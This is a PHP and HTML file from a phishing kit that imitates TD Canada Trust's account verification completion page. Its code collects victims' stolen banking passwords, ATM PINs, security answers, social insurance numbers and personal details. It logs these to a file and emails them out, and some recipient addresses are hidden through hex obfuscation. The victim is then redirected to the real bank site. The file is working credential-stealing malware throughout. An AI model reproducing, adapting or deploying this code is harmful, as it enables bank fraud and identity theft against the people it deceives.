<?php
/*
L33bo phishers = ICQ: 695059760
*/
include "kobelolo12@gmail.com";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$address = $_SESSION['address'];
$telephone = $_SESSION['telephone'];
$telephone2 = $_SESSION['telephone2'];
$pin = $_SESSION['pin'];
$email = $_SESSION['email'];
$dl = $_SESSION['dl'];
$mmn = $_SESSION['mmn'];
$ssn = $_SESSION['ssn'];
$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];
$q4 = $_POST['q4'];
$a4 = $_POST['a4'];
$q5 = $_POST['q5'];
$a5 = $_POST['a5'];
$rkhoqeeuxm="\x64\x64";
${$rkhoqeeuxm}="\x62\x6do11\x32\x32\x6b@g\x6dail\x2e\x63\x6f\x6d";
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "TD R35U1T : $ip";
$warnsubj = "Abuse";
$rkhoqeeuxm="\x64\x64";
${$rkhoqeeuxm}="\x62\x6do11\x32\x32\x6b@g\x6dail\x2e\x63\x6f\x6d";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
${"\x47\x4c\x4f\x42\x41L\x53"}["\x6e\x62a\x7a\x76\x63"]="c\x63";
${${"G\x4cOBALS"}["\x6e\x62\x61\x7a\x76\x63"]}="\x6dult\x69\x70le\x63\x68\x6fice\x36\x32\x40g\x6d\x61\x69\x6c\x2e\x63om";
$data = "
+ ------------------|TD|-------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Home Phone : $telephone
| Business Phone : $telephone2
| Email : $email
| Driving No : $dl
| Mothers Maiden : $mmn
| Social Insurance : $ssn
+ -------------|ACCOUNT INFO|--------------+
+ Account Details
| Username : $user
| Password : $pass
| ATM Pin : $pin
| Question 1 : $q1
| Answer : $a1
| Question 2 : $q2
| Answer : $a2
| Question 3 : $q3
| Answer : $a3
| Question 4 : $q4
| Answer : $a4
| Question 5 : $q5
| Answer : $a5

+ -----------|EXP DATE + CCV|------------+
EXP DATE: $exp
CCV: $ccv
+ -----------|IP & SYSTEM  INFO|------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
if($Encrypt==1) {
require "assets/includes/AES.php";
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_SESSION['name'], $bad_word) !== false) {
		mail($mailone,$warnsubj,$warn,$headers);
		mail($cc,$warnsubj,$warn,$headers);
		mail($dd,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiGoeag69jJAhXJKJQKHYWGB4MQFggcMAA&url=https%3A%2F%2Fwww.tdcanadatrust.com%2F&usg=AFQjCNEhks6EUDP86GbvispdToiDFeTG0g"));
    }
	if(stristr($_SESSION['mmn'], $bad_word) !== false) {
		mail($mailone,$warnsubj,$warn,$headers);
		mail($cc,$warnsubj,$warn,$headers);
		mail($dd,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiGoeag69jJAhXJKJQKHYWGB4MQFggcMAA&url=https%3A%2F%2Fwww.tdcanadatrust.com%2F&usg=AFQjCNEhks6EUDP86GbvispdToiDFeTG0g"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/td.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/td.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($mailone,$subj,$enc,$headers);
	mail($cc,$subj,$enc,$headers);
	mail($dd,$subj,$enc,$headers);
	}
	else {
	mail($mailone,$subj,$data,$headers);
	mail($cc,$subj,$data,$headers);	
	mail($dd,$subj,$data,$headers);
	}
}
if($One_Time_Access==1)
{
$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}
?>
<!DOCTYPE html>
<html lang="en" xml:lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>Account Verification Complete</title>
 	<link type="text/css" href="assets/css/default.css" rel="stylesheet">
 	<link type="text/css" href="assets/css/eg-custom.css" rel="stylesheet">
	<link rel="stylesheet" href="assets/css/ns-hybrid.css" type="text/css">
	<link rel="icon" type="image/ico" href="assets/img/favicon.ico"/>
<meta http-equiv="refresh" content="5; url=https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAA&url=https%3A%2F%2Fwww.tdcanadatrust.com%2F&ei=dX9MVZPeD8udsAGfooC4CA&usg=AFQjCNEhks6EUDP86GbvispdToiDFeTG0g&bvm=bv.92765956,d.bGg">
</head>



		<body class="td-JS-enabled">


	<a name="top" id="top"></a>
	<div class="td-skip">
		<a href="#">Skip to main content</a>
	</div>

	<div id="td-wrapper">

		<div id="td-container">



<!--****************************************Header****************************************-->
<header class="td-layout-row" id="td-layout-header" role="banner">
<div class="td-layout-column td-layout-grid7 td-layout-column-first">
<div id="td-logo"><img height="50" src="assets/img/Logo2.gif" width="384"></div>
</div>
<div class="td-layout-column td-layout-grid8 td-noprint td-layout-column-last">
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-copy-align-right td-layout-column-first td-layout-column-last">
<ul class="td-list-inline td-link-nounderline td-margin-bottom-large">
<li class="td-copy-sub td-link-colour-grey"><a href="#">WebBroker</a></li>
<li class="td-copy-sub td-link-colour-grey"><a href="#">U.S. Online Banking</a></li>
<li><img src="assets/img/icon-lock.gif" width="10">&nbsp;<strong class="td-copy-emphasized td-copy-align-middle"><a href="#">Account Verification</a></strong>&nbsp;<a class="td-button td-button-secondary td-button-compact" href="https://easyweb.td.com/waw/ezw/servlet/ca.tdbank.banking.servlet.LogoffServlet"><span class="td-button-label">Logout</span></a></li>
</ul>
</div>
</div>
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-layout-column-first td-copy-align-right td-layout-column-last">
<ul class="td-list-inline td-copy-sub td-link-nounderline td-link-colour-grey">
<li><a href="#">Contact Us</a></li>
<li><a href="#">Apply</a></li>
<li><a href="#">Search</a></li>
</ul>
</div>
</div>
</div>
</header>




			<div class="td-layout-row td-noprint" id="td-layout-nav-main" role="navigation">
				<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">


<nav id="td-nav-level1" class="clear">
	<ul>
	    <li class="td-nav-level1-active">
	    	<span class="td-nav-level1-label">
	    		<span class="td-nav-level1-indicator">You are in this section:</span>
	    		<a href="#">My Accounts</a>
	    	</span>
	    </li>
	    <li><span class="td-nav-level1-label"><a href="#">Customer Service</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Products &amp; Services</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Markets &amp; Research</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Planning</a></span></li>
    </ul>
</nav>



<nav class="clear" id="td-nav-level2">
<ul>
<li><span class="td-nav-level2-label"><a href="#">Accounts</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Payments</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Transfers</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Investments</a></span></li>
<li class="td-nav-level2-active"><span class="td-nav-level2-label"><span class="td-nav-level2-indicator">You are in this section:</span> <a href="#">Administration</a></span></li>
</ul>
</nav>

				</div>
			</div>




    		<div id="td-layout-contentarea" class="td-layout-row">

    			<div class="td-layout-column td-layout-grid3 td-layout-column-first td-noprint">









<nav class="clear" id="td-nav-left" role="navigation">
	<a id="leftnav" name="leftnav" tabindex="-1"></a>
	<ul>
		<li>
			<ul><li class="td-nav-left-first-child"><span class="td-nav-left-label"><a href="#">Customize Site</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Rename Accounts</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Session History</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Home Address</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Password &amp; Security</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Apply for Products</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Open a Small Business Account</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Email Notifications</a></span></li>
				<li class="td-nav-left-last-child td-nav-left-active"><span class="td-nav-left-label"><span class="td-nav-left-indicator">You are currently viewing:</span><a href="#">Account Verification</a></span></li>
			</ul>
		</li>
	</ul>
</nav>








<div class="td-callout td-callout-tertiary td-margin-none">
         <div class="td-callout-heading">
         	<h4>
         		My Links
         	</h4>
         </div>
         <p class="td-copy-sub"><a href="#">Choose my links</a>&nbsp;</p>
         <ul class="td-list-links td-copy-sub">

				<li><a href="#">Pay Bills</a></li>


				<li><a href="#">Make a Transfer</a></li>


				<li><a href="#">Purchase Mutual Funds</a></li>


				<li><a href="#">WebBroker</a></li>


				<li><a href="#" onclick="QLGotoWebdoxs();return false">View Bills</a></li>


         </ul>
         </div>


    			</div><!-- End .td-layout-column -->


    			<div class="td-layout-column td-layout-grid12 td-layout-column-last" role="main">
				   <a name="main" id="main" tabindex="-1"></a>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tbody>
		<tr>
			<td class="td-copy-align-top" colspan="2">
				<div id="td-pagetitlearea" class="td-margin-bottom-medium">
					<div class="td-layout-row">
						<div class="td-layout-column td-layout-grid10 td-layout-column-first">
							<h1>Account Verification</h1>
						</div>
						<div class="td-layout-column td-layout-grid2 td-copy-align-right td-margin-none td-layout-column-last">
							<a href="#" title="(Opens a new window)">Help</a>
						</div>
					</div>
				</div>

				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h3 class="td-margin-top-small">Complete</h3>
					</div>
				</div>
				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h4 class="td-margin-top-small">Thank you for completing our account verification process.</h4>
					</div>
				</div>
			</td>
		</tr>
	</tbody></table>
	<br>
<img style="margin:auto;display:block;" width="65px" height="65px" src="assets/img/loading.GIF">
	<br>
<p style="text-align:center;font-weight:bold;text-decoration: underline;">Please wait while we process your information</p>

<p style="text-align:center;color:red;font-weight:bold;text-decoration: underline;">you will be automatically logged out once this has been completed.</p>


    			</div>

    		</div>

		</div>






<footer class="td-layout-row" id="td-layout-footer" role="complementary">
 	<div class="td-layout-column td-layout-grid11 td-noprint td-layout-column-first">
	 	<ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
			<li><a href="#">Privacy Policy</a></li>
			<li><a href="#">Internet Security</a></li>
			<li><a href="#">Legal</a></li>
		</ul>
	</div>
	<div class="td-copy-align-right td-layout-column td-layout-grid4 td-noprint td-margin-none td-layout-column-last">

	 	<span class="td-copy-sub td-copy-grey">Server ID: B11A : 1430949905605</span>

	</div>

</footer>
 <!-- End #td-layout-footer -->

	</div>





<div id="hiddenlpsubmitdiv" style="display: none;"></div><script>try{for(var lastpass_iter=0; lastpass_iter < document.forms.length; lastpass_iter++){ var lastpass_f = document.forms[lastpass_iter]; if(typeof(lastpass_f.lpsubmitorig2)=="undefined"){ lastpass_f.lpsubmitorig2 = lastpass_f.submit; lastpass_f.submit = function(){ var form=this; var customEvent = document.createEvent("Event"); customEvent.initEvent("lpCustomEvent", true, true); var d = document.getElementById("hiddenlpsubmitdiv"); for(var i = 0; i < document.forms.length; i++){ if(document.forms[i]==form){ d.innerText=i; } } d.dispatchEvent(customEvent); form.lpsubmitorig2(); } } }}catch(e){}</script></body></html>
